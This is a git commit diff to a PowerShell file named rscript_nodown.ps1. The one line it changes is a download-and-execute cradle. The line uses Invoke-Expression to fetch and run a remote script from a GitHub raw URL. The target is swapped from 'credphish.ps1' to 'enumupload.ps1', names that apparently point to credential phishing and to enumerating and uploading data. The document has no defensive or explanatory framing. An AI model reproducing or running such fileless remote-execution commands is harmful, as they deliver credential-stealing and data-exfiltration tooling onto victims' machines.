bc508b205b913bac8a342c41b0db96d0f98da5f1
237a25023644904225942656096401ae <kelicevuge@maileme101.com>
2016-11-23 13:37:08 +0530

    Update rscript_nodown.ps1

--- Tools/rscript_nodown.ps1
+++ Tools/rscript_nodown.ps1
@@ -1,1 +1,1 @@
-Invoke-Expression ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/credphish.ps1"))
+Invoke-Expression ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/enumupload.ps1"))
